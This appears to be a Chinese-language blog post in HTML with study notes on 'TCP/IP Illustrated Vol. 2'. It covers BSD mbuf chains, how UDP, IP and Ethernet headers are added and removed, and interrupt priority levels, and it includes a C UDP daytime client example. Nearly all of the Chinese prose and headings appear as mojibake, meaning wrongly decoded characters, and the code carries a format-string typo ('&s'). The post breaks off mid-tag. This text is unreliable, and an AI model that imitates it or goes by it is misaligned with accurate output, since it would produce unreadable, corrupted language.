    <content type="html"><![CDATA[<blockquote><p>å‚è€ƒæ•™æã€ŠTCP&#x2F;IPè¯¦è§£ å·2ï¼šå®ç°ã€‹ï¼Œæ–‡å†…ç¤ºæ„å›¾å¤§å¤šå–è‡ªè¯¥æ•™æã€‚æœ¬æ–‡ä¸ºå¤ä¹ æ—¶è‡ªè¡Œæ€»ç»“ï¼Œéš¾å…å­˜åœ¨ä¸å…¨æˆ–è€…é”™è¯¯ï¼Œæ±‚æ±‚å¤§ä¼™è½»å–·ã€‚å¦‚æœ‰é—®é¢˜å¯ä»¥ç•™è¨€åœ¨æ–‡æœ«è¯„è®ºåŒºï¼Œæˆ–è€…ç›´æ¥ç§èŠï¼Œæˆ‘ä¼šåŠæ—¶æ›´æ”¹æ–‡ç« å†…å®¹ã€‚</p></blockquote><h2 id="ç¬¬ä¸€ç« -æ¦‚è¿°"><a href="#ç¬¬ä¸€ç« -æ¦‚è¿°" class="headerlink" title="ç¬¬ä¸€ç«  æ¦‚è¿°"></a>ç¬¬ä¸€ç«  æ¦‚è¿°</h2><h3 id="åŸºæœ¬æ¡†æ¶"><a href="#åŸºæœ¬æ¡†æ¶" class="headerlink" title="åŸºæœ¬æ¡†æ¶"></a>åŸºæœ¬æ¡†æ¶</h3><h4 id="ç½‘ç»œè¾“å…¥è¾“å‡ºå±‚é—´æ¡†æ¶"><a href="#ç½‘ç»œè¾“å…¥è¾“å‡ºå±‚é—´æ¡†æ¶" class="headerlink" title="ç½‘ç»œè¾“å…¥è¾“å‡ºå±‚é—´æ¡†æ¶"></a>ç½‘ç»œè¾“å…¥è¾“å‡ºå±‚é—´æ¡†æ¶</h4><p>åŸºæœ¬æ¡†æ¶å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬ä¼šåœ¨åé¢è¯¦ç»†è®¨è®ºè¾“å…¥è¾“å‡º</p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424174856553.png" alt="image-20230424174856553"></p><h4 id="UDPç¤ºä¾‹socketç¨‹åºæ¡†æ¶"><a href="#UDPç¤ºä¾‹socketç¨‹åºæ¡†æ¶" class="headerlink" title="UDPç¤ºä¾‹socketç¨‹åºæ¡†æ¶"></a>UDPç¤ºä¾‹socketç¨‹åºæ¡†æ¶</h4><blockquote><p>è¿™æ®µCä»£ç ä¹Ÿå……å½“åç»­æˆ‘ä»¬åˆ†æè¾“å…¥è¾“å‡ºæ—¶çš„ä¾‹å­</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* Send a UDP datagram to the daytime server on some other host,</span><br><span class="hljs-comment">* read the reply. and print the time and date on the server .</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span>    <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span>    <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span>    <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span>    <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span>    <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span>    <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span>    <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFFSIZE    150     <span class="hljs-comment">/* arbitrary size */</span></span><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">serv</span>;</span><br>    <span class="hljs-type">char</span> buff [BUFFSIZE] ;<br>    <span class="hljs-type">int</span> sockfd, n;<br>    <span class="hljs-keyword">if</span> ((sockfd = socket(PF_INET, SOCK_DGRAM,<span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>)<br>        err_sys (<span class="hljs-string">&quot; socket error&quot;</span>) ;<br>    <br>    bzero((<span class="hljs-type">char</span> *) &amp;serv, <span class="hljs-keyword">sizeof</span> (serv));<br>    <br>    serv.sin_family = AF_INET;<br>    serv.sin_addr.s_addr = inet_addr(<span class="hljs-string">&quot;140.252.1.32&quot;</span>);<br>    serv.sin_port = htons(<span class="hljs-number">13</span>);<br><br>    <span class="hljs-keyword">if</span> (sendto (sockfd, buff, BUFFSIZE,<span class="hljs-number">0</span>,<br>        (<span class="hljs-keyword">struct</span> sockaddr *) &amp;serv, <span class="hljs-keyword">sizeof</span>(serv)) != BUFFSIZE)<br>    err_sys (<span class="hljs-string">&quot;sendto error&quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span> ((n = recvfrom(sockfd, buff, BUFFSIZE, <span class="hljs-number">0</span>,<br>        (<span class="hljs-keyword">struct</span> sockaddr *) <span class="hljs-literal">NULL</span>, (<span class="hljs-type">int</span> *) <span class="hljs-literal">NULL</span>))&lt; <span class="hljs-number">2</span>)<br>    err_sys(<span class="hljs-string">&quot;recvfrom error&quot;</span>);<br>    buff[n - <span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;        <span class="hljs-comment">/* null terminate */</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&amp;s\n&quot;</span>, buff);<br><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="è¾“å‡ºæµç¨‹"><a href="#è¾“å‡ºæµç¨‹" class="headerlink" title="è¾“å‡ºæµç¨‹"></a>è¾“å‡ºæµç¨‹</h3><p>ä¸‹é¢è€ƒè™‘æ’å£å±‚è°ƒç”¨<code>sendto()</code>å‡½æ•°æ—¶å‘ç”Ÿçš„æµç¨‹</p><h4 id="mbufç»“æ„"><a href="#mbufç»“æ„" class="headerlink" title="mbufç»“æ„"></a>mbufç»“æ„</h4><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424135820569.png" alt="ç”¨ä¸¤ä¸ªmbufæ¥å­˜å‚¨150å­—èŠ‚çš„æ•°æ®"></p><p>å¦‚å›¾æ˜¯ä¸€ä¸ªå«æœ‰150å­—èŠ‚çš„mbufåˆ†ç»„ã€‚å®è§‚æ¥çœ‹ï¼Œå¯ä»¥å‘ç°<code>mbuf</code>æ˜¯ç”±<code>m_next</code>æŒ‡é’ˆé“¾æ¥çš„å•é“¾è¡¨ï¼Œè¿™ç§å®‰æ’æ–¹å¼å«åš<strong>mbufé“¾è¡¨</strong>. </p><p>ç»†èŠ‚æ¥çœ‹å„ä¸ªæˆå‘˜å˜é‡åŠå…¶å«ä¹‰ï¼š</p><ul><li><code>m_next</code>ç”¨æ¥è¿æ¥ä¸‹ä¸€ä¸ª<code>mbuf</code></li><li><code>m_nextpkt</code>ç”¨æ¥è¿æ¥ä¸‹ä¸€ä¸ª<strong>mbufåˆ†ç»„</strong></li><li><code>m_len</code>æ ‡è¯†æ‰€åœ¨çš„<code>mbuf</code>åŒ…å«çš„<strong>dataæ•°æ®é•¿åº¦</strong></li><li><code>m_type</code>æ ‡è¯†æ‰€åœ¨<code>mbuf</code>çš„ç±»å‹</li><li><code>m_data</code>æŒ‡å‘æ‰€åœ¨<code>mbuf</code>çš„<strong>æ•°æ®å¼€å¤´åœ°å€</strong></li><li><code>m_flags</code>ç”¨æ¥æ ‡è¯†æ‰€åœ¨<code>mbuf</code>çš„ç±»å‹ï¼Œä½†ä¸åŒäº<code>m_type</code></li></ul><p>ä»¥åŠä¸¤ä¸ªç‰¹æ®Šçš„æˆå‘˜ï¼Œå…±åŒç»„æˆäº†<strong>mbufåˆ†ç»„é¦–éƒ¨</strong>ï¼Œå 8ä¸ªbyteã€‚åªæœ‰å½“mbufçš„<strong>flagsä¸ºM_PKTHDR</strong>æ—¶ï¼Œæ‰å¯ç”¨ï¼š</p><ul><li><code>m_pkthdr.len</code>ç”¨æ¥è¡¨ç¤ºæ•´ä¸ªåˆ†ç»„çš„dataé•¿åº¦</li><li><code>m_pkthdr.rcvif</code></li></ul><p>æ•´ä¸ªmbufçš„sizeä¸º128 byteï¼Œé™¤å»å‰é¢çš„æˆå‘˜å˜é‡å’Œé¦–éƒ¨çš„è¯å¯ä»¥å­˜å‚¨100å­—èŠ‚çš„æ•°æ®ï¼Œå¦‚æœä¸åŒ…å«mbufåˆ†ç»„é¦–éƒ¨ï¼Œåˆ™å¯ä»¥å­˜å‚¨108å­—èŠ‚ã€‚</p><h4 id="æ·»åŠ IPå’ŒUDPé¦–éƒ¨"><a href="#æ·»åŠ IPå’ŒUDPé¦–éƒ¨" class="headerlink" title="æ·»åŠ IPå’ŒUDPé¦–éƒ¨"></a>æ·»åŠ IPå’ŒUDPé¦–éƒ¨</h4><p>ä¸‹å›¾æ˜¯ä»¥ä¸€ä¸ª150å­—èŠ‚æ•°æ®çš„mbufï¼ŒåŠ å…¥IPå’ŒUDPé¦–éƒ¨åçš„mbufæƒ…å†µ</p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424142206955.png" alt="æ·»åŠ IPå’ŒUDPé¦–éƒ¨"></p><p>å…·ä½“æ¥è¯´ï¼Œå½“UDPè¾“å‡ºä¾‹ç¨‹è¢«è°ƒç”¨æ—¶ï¼š</p><ol><li>é¦–å…ˆè®²åŸæœ‰æŒ‡å‘150byteçš„mbufé“¾è¡¨çš„æŒ‡é’ˆä½œä¸ºå‚æ•°è¿›è¡Œä¼ é€’</li><li>ç„¶åæ–°å»ºä¸€ä¸ªå«æœ‰<strong>28å­—èŠ‚</strong>IPé¦–éƒ¨å’ŒUDPé¦–éƒ¨çš„mbuf</li><li>å°†æ–°å»ºçš„mbufçš„<code>m_next</code>åŸŸæŒ‡å‘åŸæœ‰ä¼ å…¥çš„mbufæŒ‡é’ˆ</li><li>å°†åŸæœ‰8byteçš„åˆ†ç»„é¦–éƒ¨copyåˆ°æ–°çš„é¦–éƒ¨</li></ol><blockquote><p>å¦å¤–éœ€è¦æ³¨æ„ï¼Œæˆ‘ä»¬åœ¨ç¬¬4æ­¥ä¸­å°†åˆ†ç»„é¦–éƒ¨å¤åˆ¶åˆ°äº†æ–°çš„mbufä¸­ï¼Œé‚£ä¹ˆæ–°æ—§mbufçš„<strong>m_flags</strong>åŸŸä¹Ÿè¦è¿›è¡Œç›¸åº”çš„è®¾ç½®ã€‚</p></blockquote><p>äºæ˜¯æ–°çš„mbufæˆä¸ºäº†æ–°çš„åˆ†ç»„é¦–éƒ¨ï¼Œä¸”mbufé“¾è¡¨çš„æ€»é•¿åº¦ç”±2å˜3ï¼Œmbufåˆ†ç»„çš„æ•°æ®é•¿åº¦å¢åŠ äº†28ï¼Œå˜æˆäº†178byteã€‚å¯ä»¥çœ‹åˆ°ï¼Œåœ¨<strong>åˆ†ç»„é¦–éƒ¨å’ŒIP&#x2F;UDPé¦–éƒ¨ä¹‹é—´å­˜åœ¨78å­—èŠ‚çš„ç©ºç¼º</strong>ï¼Œé€šè¿‡é€‚å½“çš„è°ƒæ•´<code>m_data</code>å’Œ<code>m_len</code>æˆ‘ä»¬å¯ä»¥åœ¨å…¶ä¸­åŠ å…¥ä¹‹åçš„é¦–éƒ¨ï¼Œè€Œä¸éœ€è¦æ–°å»ºmbuf.</p><p>ä¹‹åç”±UDPä¾‹ç¨‹å¡«å†™UDPé¦–éƒ¨å’ŒIPé¦–éƒ¨çš„ä¸€éƒ¨åˆ†å†…å®¹ï¼Œä¸”UDPæ£€éªŒå’Œè®¡ç®—åä¹Ÿä¼šå­˜å‚¨åœ¨è¿™é‡Œã€‚æ¥ç€ï¼ŒUDPè¾“å‡ºä¾‹ç¨‹è°ƒç”¨IPè¾“å‡ºä¾‹ç¨‹ï¼Œå¹¶æŠŠæ­¤mbufé“¾è¡¨çš„æŒ‡é’ˆä¼ é€’ç»™IPè¾“å‡ºä¾‹ç¨‹ã€‚UDPå’ŒIPé¦–éƒ¨å‰©ä½™çš„éƒ¨åˆ†ç”±IPè¾“å‡ºä¾‹ç¨‹è¿›è¡Œå¡«å†™ï¼Œå¦‚IPæ ¡éªŒå’Œç­‰ç­‰ã€‚</p><h4 id="ä»¥å¤ªç½‘è¾“å‡º"><a href="#ä»¥å¤ªç½‘è¾“å‡º" class="headerlink" title="ä»¥å¤ªç½‘è¾“å‡º"></a>ä»¥å¤ªç½‘è¾“å‡º</h4><p>åœ¨å®Œæˆä¸Šè¿°æ“ä½œåï¼ŒIPè¾“å‡ºä¾‹ç¨‹è°ƒç”¨ä»¥å¤ªç½‘æ¥å£å¹¶æŠŠmbufé“¾è¡¨ç»§ç»­ä¼ é€’ï¼Œä»¥å¤ªç½‘è¾“å‡ºå‡½æ•°æµç¨‹å¦‚ä¸‹ï¼š</p><ol><li>å°†32ä¸ºIPåœ°å€è§£æä¸º48ä½6ä¸ªå­—èŠ‚çš„ä»¥å¤ªç½‘åœ°å€</li><li>å‘mbufé¦–éƒ¨ä¹‹å‰ç©ºå‡ºæ¥çš„åœ°æ–¹ï¼Œæ·»åŠ 14å­—èŠ‚çš„ä»¥å¤ªç½‘é¦–éƒ¨</li><li>å°†mbufæ”¾å…¥ä»¥å¤ªç½‘è¾“å…¥è¾“å‡ºé˜Ÿåˆ—é˜Ÿå°¾</li></ol><blockquote><p>14å­—èŠ‚çš„ä»¥å¤ªç½‘é¦–éƒ¨åŒ…å«ï¼š<strong>6å­—èŠ‚çš„ä»¥å¤ªç½‘æºåœ°å€ï¼Œ6å­—èŠ‚çš„ä»¥å¤ªç½‘ç›®æ ‡åœ°å€ï¼Œ2å­—èŠ‚çš„ä»¥å¤ªç½‘å¸§ç±»å‹</strong></p></blockquote><h4 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h4><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå½“è¿›ç¨‹è°ƒç”¨<code>sendto()</code>ç³»ç»Ÿè°ƒç”¨æ—¶ï¼š</p><ol><li>å°†ç”¨æˆ·æ•°æ®æ‹·å…¥mbufé“¾è¡¨</li><li>æ·»åŠ UDP&#x2F;IPé¦–éƒ¨</li><li>æ·»åŠ ä»¥å¤ªç½‘é¦–éƒ¨ï¼Œéšåè¾“å‡º</li></ol><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424145058791.png" alt="image-20230424145058791"></p><h3 id="è¾“å…¥å¤„ç†"><a href="#è¾“å…¥å¤„ç†" class="headerlink" title="è¾“å…¥å¤„ç†"></a>è¾“å…¥å¤„ç†</h3><blockquote><p>è¾“å…¥å¤„ç†ä¸åˆšè°ˆåˆ°çš„è¾“å‡ºå¤„ç†ä¸åŒï¼Œå› ä¸ºè¾“å…¥æ—¶å¼‚æ­¥çš„ã€‚å…·ä½“æ¥è®²ï¼Œä»–æ˜¯é€šè¿‡ä¸€ä¸ªè¾“å…¥å®Œæˆçš„ä¸­æ–­ä½¿ä»¥å¤ªç½‘è®¾å¤‡é©±åŠ¨ç¨‹åºæ¥æ¥å—ä¸€ä¸ªè¾“å…¥åˆ†ç»„ï¼Œè€Œä¸æ˜¯é€šè¿‡è¿›ç¨‹çš„ç³»ç»Ÿè°ƒç”¨ã€‚å†…æ ¸å¤„ç†è¿™ä¸ªè®¾å¤‡ä¸­æ–­ï¼Œå¹¶è°ƒåº¦è®¾å¤‡é©±åŠ¨ç¨‹åºè¿›å…¥è¿è¡ŒçŠ¶æ€ã€‚</p></blockquote><h4 id="ä»¥å¤ªç½‘è¾“å…¥"><a href="#ä»¥å¤ªç½‘è¾“å…¥" class="headerlink" title="ä»¥å¤ªç½‘è¾“å…¥"></a>ä»¥å¤ªç½‘è¾“å…¥</h4><p>å‡è®¾ä¸€ä¸ªæ­£å¸¸çš„æ¥å—å·²ç»å®Œæˆï¼Œä»¥å¤ªç½‘è®¾å¤‡é©±åŠ¨ç¨‹åºä¼šå¤„ç†è¿™ä¸ªä¸­æ–­ã€‚åœ¨ä¸‹å›¾çš„è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬æ¥æ”¶äº†54ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œå¹¶å°†å…¶å¤åˆ¶åˆ°äº†mbufå½“ä¸­ï¼Œå…¶ä¸­åŒ…æ‹¬ï¼š20å­—èŠ‚çš„IPé¦–éƒ¨ï¼Œ8å­—èŠ‚çš„UDPé¦–éƒ¨ï¼Œ26å­—èŠ‚çš„æ•°æ®</p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424151929217.png" alt="image-20230424151929217"></p><p>å¯ä»¥çœ‹åˆ°å…¶ä¸­åˆ†é…äº†16å­—èŠ‚ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰ä½¿ç”¨ã€‚è¿™ä¸ªç©ºé—´æ˜¯åˆ†é…ç»™æ¥å£å±‚çš„é¦–éƒ¨ï¼Œå…¶ä»–æ•°æ®å­˜æ”¾åœ¨å‰©ä½™çš„84å­—èŠ‚ä¸­ã€‚</p><p>æ¥ç€è®¾å¤‡é©±åŠ¨ç¨‹åºä¼šæ ¹æ®ä»¥å¤ªç½‘å¸§ä¸­çš„ç±»å‹å­—æ®µæ¥å†³å®šè¿™ä¸ªåˆ†ç”±é‚£ä¸ªåè®®å±‚æ¥æ¥æ”¶ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå°†ç”±IPè¾“å…¥ä¾‹ç¨‹è¿›è¡Œæ¥æ”¶ã€‚ä»è€Œmbufä¼šè¢«åŠ å…¥åˆ°IPè¾“å…¥é˜Ÿåˆ—å½“ä¸­ï¼Œå¦å¤–ä¼šäº§ç”Ÿä¸€ä¸ªè½¯ä¸­æ–­æ¥æ‰§è¡ŒIPè¾“å…¥ä¾‹ç¨‹ã€‚</p><h4 id="IPè¾“å…¥"><a href="#IPè¾“å…¥" class="headerlink" title="IPè¾“å…¥"></a>IPè¾“å…¥</h4><p>IPè¾“å…¥æ˜¯å¼‚æ­¥çš„ï¼Œé€šè¿‡è½¯ä¸­æ–­æ¥æ‰§è¡Œã€‚è¿™ä¸ªè½¯ä¸­æ–­ç”±æ¥å£å±‚æ¥æ”¶åˆ°IPæ•°æ®æŠ¥æ—¶è§¦å‘ã€‚IPå¤„ç†ä¾‹ç¨‹ä¼šå¾ªç¯å¤„ç†IPè¾“å…¥é˜Ÿåˆ—ä¸Šçš„æ¯ä¸€ä¸ªæ•°æ®æŠ¥ï¼Œå¹¶åœ¨æ•´ä¸ªé˜Ÿåˆ—å®Œæˆåè¿”å›ã€‚IPæ•°æ®æŠ¥å¤„ç†æµç¨‹åŒ…æ‹¬ï¼š</p><ul><li>éªŒè¯IPé¦–éƒ¨æ ¡éªŒå’Œ</li><li>å¤„ç†IPé€‰é¡¹</li><li>éªŒè¯æ•°æ®æŠ¥ è¢«ä¼ é€’åˆ°æ­£ç¡®çš„ä¸»æœºï¼ˆé€šè¿‡æ¯”è¾ƒç›®çš„IPåœ°å€å’Œä¸»æœºIPåœ°å€ï¼‰</li><li>è½¬å‘æ•°æ®åŒ…ï¼ˆå½“ç³»ç»Ÿä¸ºè·¯ç”±å™¨ä¸”ç›®çš„åœ°å€ä¸ºå…¶ä»–IPæ—¶ï¼‰</li><li>å¦‚æœåˆ°è¾¾æœ€ç»ˆç›®çš„åœ°å€ï¼Œåˆ™ä¼šè°ƒç”¨ä¸‹ä¸€æ­¥è¾“å…¥ä¾‹ç¨‹ï¼ˆå¦‚TCPã€UDPã€ICMPåŠIGMPç­‰ï¼‰</li></ul><blockquote><p> åœ¨æœ¬ä¾‹ä¸­ï¼Œæˆ‘ä»¬å‡è®¾ä¸‹ä¸€æ­¥è¾“å…¥å¤„ç†ä¾‹ç¨‹ä¸ºUDP</p></blockquote><h4 id="UDPè¾“å…¥"><a href="#UDPè¾“å…¥" class="headerlink" title="UDPè¾“å…¥"></a>UDPè¾“å…¥</h4><p>UDPè¾“å…¥ä¾‹ç¨‹ä¼šéªŒè¯UDPé¦–éƒ¨ä¸­çš„å„å­—æ®µï¼Œç„¶åç¡®å®šæ˜¯å¦ä¸€ä¸ªè¿›ç¨‹æ¥æ”¶æ¬¡æ•°æ®æŠ¥ã€‚</p><blockquote><p>ä¸€ä¸ªè¿›ç¨‹å¯ä»¥æ¥æ”¶åˆ°æŒ‡å®šUDPç«¯å£çš„æ‰€æœ‰æ•°æ®æŠ¥ï¼Œæˆ–è®©å†…æ ¸æ ¹æ®æºä¸ç›®æ ‡IPåœ°å€ä¸ç›®æ ‡ç«¯å£å·æ¥é™åˆ¶æ•°æ®æŠ¥çš„æ¥æ”¶ã€‚</p></blockquote><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424155315099.png" alt="image-20230424155315099"></p><p>å¯ä»¥çœ‹åˆ°ï¼ŒåŸæœ‰çš„mbufè¢«æ’å…¥åˆ°äº†ä¸€ä¸ªæ–°çš„mbufä¸­ã€‚ç”±äºæˆ‘ä»¬çš„æ•°æ®æŠ¥éœ€è¦ä¼ ç»™è¿›ç¨‹ï¼Œæ‰€ä»¥è¿™ä¸ªæ–°çš„mbufåŒ…å«äº†å‘é€æ–¹çš„IPåœ°å€å’Œç«¯å£å·ï¼ˆä»IPé¦–éƒ¨ä¸­æ‹†åˆ†å‡ºæ¥ï¼‰ã€‚</p><p>å¦å¤–ï¼Œå¦‚æœæˆ‘ä»¬å¯¹æ¯”å›¾ä¸­å³ä¾§æ”¾ç½®æ•°æ®çš„mbufå’Œä»¥å¤ªç½‘è¾“å…¥çš„mbufå¯ä»¥å‘ç°ï¼Œ<code>m_len</code>å’Œ<code>m_pkthdr.len</code> éƒ½å‡å°äº†28å­—èŠ‚(å³IPé¦–éƒ¨å’ŒUDPé¦–éƒ¨çš„éƒ¨åˆ†)ï¼Œ<code>m_data</code>æŒ‡å‘çš„åœ°å€ä¹Ÿå‡å°äº†28ï¼Œåªä¿ç•™äº†26å­—èŠ‚çš„dataæ•°æ®ã€‚</p><blockquote><p>é“¾è¡¨çš„ç¬¬ä¸€ä¸ªmbufçš„<strong>m_type</strong>ç±»å‹è¢«è®¾ç½®ä¸ºäº†<strong>MT_SONAME</strong>ï¼Œä¸”è¿™ä¸ªmbufæ˜¯ç”±æ’å£å±‚å»ºç«‹ï¼Œå°†è¿™äº›ä¿¡æ¯è¿”å›ç»™è°ƒç”¨ç³»ç»Ÿè°ƒç”¨recvfromå’Œrecvmsgçš„è¿›ç¨‹ä¸­ã€‚å³ä¾¿ç¬¬äºŒä¸ªmbufæœ‰ç©ºé—´å¯ä»¥ç”¨æ¥å­˜å‚¨æ’å£åœ°å€ç»“æ„(å‘é€æ–¹IPåœ°å€å’Œç«¯å£å·)ï¼Œä¹Ÿä¸èƒ½æ”¾ç½®åœ¨ä¸€èµ·ã€‚å› ä¸ºä¸¤ä¸ªmbufçš„ç±»å‹å¹¶ä¸ç›¸åŒï¼Œä¸€ä¸ªæ˜¯<strong>MT_SONAME</strong>ï¼Œä¸€ä¸ªæ˜¯<strong>MT_DATA</strong>ã€‚</p></blockquote><h4 id="è¿›ç¨‹è¾“å…¥"><a href="#è¿›ç¨‹è¾“å…¥" class="headerlink" title="è¿›ç¨‹è¾“å…¥"></a>è¿›ç¨‹è¾“å…¥</h4><p>å½“è¿›ç¨‹è°ƒç”¨<code>recvfrom()</code>æ—¶ï¼Œè¿›ç¨‹ä¼šåœ¨å†…æ ¸ä¸­ä¿æŒç¡çœ çŠ¶æ€ã€‚ç°åœ¨ï¼Œå†…æ ¸ä¼šå”¤é†’æˆ‘ä»¬çš„è¿›ç¨‹ï¼Œå¹¶æŠŠmbufä¸­çš„æ•°æ®å¤åˆ¶åˆ°ç¨‹åºçš„ç¼“å­˜ä¸­ã€‚ç„¶åé‡Šæ”¾æ‰è¿™äº›mbuf</p><blockquote><p>åœ¨è°ƒç”¨recvfromæ—¶ï¼Œæˆ‘ä»¬å°†ç¬¬5ã€6ä¸ªå‚æ•°è®¾ç½®ä¸º<strong>NULL</strong>ï¼Œè¡¨ç¤ºæˆ‘ä»¬å¹¶ä¸å…³å¿ƒå‘é€æ–¹çš„IPåœ°å€å’ŒUDPç«¯å£å·ï¼Œæ­¤æ—¶recvformåªä¼šè¿”å›ç¬¬äºŒä¸ªmbufçš„dataã€‚</p></blockquote><h3 id="ä¸­æ–­çº§åˆ«"><a href="#ä¸­æ–­çº§åˆ«" class="headerlink" title="ä¸­æ–­çº§åˆ«"></a>ä¸­æ–­çº§åˆ«</h3><p>å¦‚ä¸‹å›¾æ‰€ç¤ºæ˜¯8ä¸ªç¡¬ä»¶åŠè½¯ä»¶ä¸­æ–­çš„ä¼˜å…ˆçº§ã€‚åˆ’çº¢çº¿çš„éƒ¨åˆ†ä¸ºæˆ‘ä»¬ä¹‹å‰è°ˆåˆ°çš„ä¸¤ä¸ªéƒ¨åˆ†ï¼š<strong>splnet(è½¯ä¸­æ–­ï¼Œæ‰§è¡Œåè®®å±‚ä»£ç )<strong>ï¼Œ</strong>splimp(ç¡¬ä¸­æ–­æ‰§è¡Œæ¥å£å±‚ä»£ç )</strong></p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424175810425.png" alt="image-20230424175810425"></p><h2 id="ç¬¬äºŒç« -å­˜å‚¨å™¨å­˜å‚¨"><a href="#ç¬¬äºŒç« -å­˜å‚¨å™¨å­˜å‚¨" class="headerlink" title="ç¬¬äºŒç«  å­˜å‚¨å™¨å­˜å‚¨"></a>ç¬¬äºŒç«  å­˜å‚¨å™¨å­˜å‚¨</h2><h3 id="mbufåˆ†ç±»"><a href="#mbufåˆ†ç±»" class="headerlink" title="mbufåˆ†ç±»"></a>mbufåˆ†ç±»</h3><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424181654748.png" alt="image-20230424181654748"></p><p>ç”±ä¸Šå›¾æ‰€ç¤ºï¼Œæ ¹æ®mbuf<code>flags</code>åŸŸï¼Œæˆ‘ä»¬å¯ä»¥å°†mbufåˆ†ä¸º4ç±»ï¼š</p><ul><li><strong>flags &#x3D;&#x3D; 0</strong>ï¼ŒåªåŒ…å«dataï¼Œä¸”dataæœ€å¤§ä¸º108 byte</li><li><strong>flags &#x3D;&#x3D; M_PKTHDR</strong> ï¼ŒåŒ…å«8 byteåˆ†ç»„å¤´éƒ¨ï¼Œ dataæœ€å¤§ä¸º100 byte</li><li><strong>flags &#x3D;&#x3D; M_EXT</strong>ï¼ŒåŒ…å«2048byteçš„é¢å¤–ç©ºé—´ï¼Œä¸”æ•°æ®æœ€å°‘ä¸º208byte</li><li><strong>flags &#x3D;&#x3D; M_PKTHDR | M_EXT</strong>ï¼Œåœ¨é¢å¤–ç©ºé—´çš„åŸºç¡€ä¸Šå¤šäº†åˆ†ç»„å¤´éƒ¨ï¼Œä¸”æ•°æ®æœ€å°é•¿åº¦ä¸º208byte</li></ul><blockquote><p>é˜´å½±éƒ¨åˆ†ä¸ºä¸ä½¿ç”¨çš„éƒ¨åˆ†</p></blockquote><p>å¯ä»¥çœ‹åˆ°ï¼Œåä¸¤ç±»çš„mufåˆå¤šäº†ä¸‰ç§åŸŸï¼š</p><ul><li><code>m_ext.ext_buf</code>ï¼ŒæŒ‡å‘é¢å¤–ç©ºé—´çš„èµ·å§‹åœ°å€ï¼ˆm_dataæŒ‡å‘çš„æ˜¯ç¼“å­˜çš„èµ·å§‹ï¼‰</li><li><code>m_ext.ext_free</code>ï¼Œåœ¨Net&#x2F;3ä¸­ä¸ä½¿ç”¨</li><li><code>m_ext.ext_size</code>ï¼Œé¢å¤–ç©ºé—´çš„å¤§å°ï¼Œä¸€èˆ¬ä¸º1024æˆ–2048ï¼Œæœ¬ä¹¦ä»¥2048ä¸ºä¸»mub</li></ul><h3 id="ç®€å•çš„mbufå®å’Œå‡½æ•°"><a 